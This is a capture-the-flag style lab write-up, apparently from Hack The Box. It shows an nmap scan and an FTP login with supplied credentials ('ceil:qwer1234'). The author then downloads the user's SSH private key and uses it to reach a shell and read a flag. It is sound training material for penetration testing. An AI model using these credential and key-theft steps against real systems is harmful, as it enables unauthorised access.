## Task

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture.

The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.

Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.

The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

---


## Attack Summary

| Step | Vector                                  | Outcome                                                            |
| ---- | --------------------------------------- | ------------------------------------------------------------------ |
| 1    | Nmap service/version scan               | Identified 4 open services, leaked hostname & username via banners |
| 2    | FTP (port 2121) login w/ provided creds | Full read access to `ceil`'s home directory                        |
| 3    | FTP file retrieval of `.ssh/id_rsa`     | Private key exfiltrated despite restrictive local file permissions |
| 4    | SSH key-based authentication            | Shell access as `ceil`                                             |
| 5    | Filesystem search                       | `flag.txt` located and read                                        |


## Nmap Scan

```bash
nmap -sC -sV 10.129.42.195 --open
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp      ProFTPD (ftp.int.inlanefreight.htb)
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp      ProFTPD (Ceil's FTP)
```

Banner grabbing revealed a username (`ceil`) tied to a non-standard FTP port, narrowing the attack path.

---

## FTP Enumeration (Port 2121)

Logged in with the supplied credentials against the non-standard FTP port identified during the scan.

```bash
ftp ceil@10.129.42.195 -P 2121
```

```
220 ProFTPD Server (Ceil's FTP) [10.129.42.195]
331 Password required for ceil
Password:
230 User ceil logged in
```

### Directory Listing

```
drwxr-xr-x   4 ceil ceil  4096 Nov 10  2021 .
drwxr-xr-x   4 ceil ceil  4096 Nov 10  2021 ..
-rw-------   1 ceil ceil   294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil ceil   220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil ceil  3771 Nov 10  2021 .bashrc
drwx------   2 ceil ceil  4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil ceil   807 Nov 10  2021 .profile
drwx------   2 ceil ceil  4096 Nov 10  2021 .ssh
-rw-------   1 ceil ceil   759 Nov 10  2021 .viminfo
```

The presence of a `.ssh` directory hinted at the presence of a private rsa key.

### `.ssh` Directory Contents

```
-rw-rw-r--   1 ceil ceil   738 Nov 10  2021 authorized_keys
-rw-------   1 ceil ceil  3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil ceil   738 Nov 10  2021 id_rsa.pub
```

The private key is downloaded locally.

```bash
ftp> get id_rsa
```

---

## SSH access as ceil

Setting permissions:

```bash
chmod 600 ceil.key
```

### SSH Login

```bash
ssh ceil@10.129.42.195 -i ceil.key
```

```
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
...
Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$
```

Access obtained as the `ceil` user via the SSH private key.

---

## Flag

```bash
ceil@NIXEASY:~$ find / -name "flag.txt" 2>/dev/null
/home/flag/flag.txt

ceil@NIXEASY:~$ cat /home/flag/flag.txt
```

**Flag:**

```
HTB{REDACTED}
```
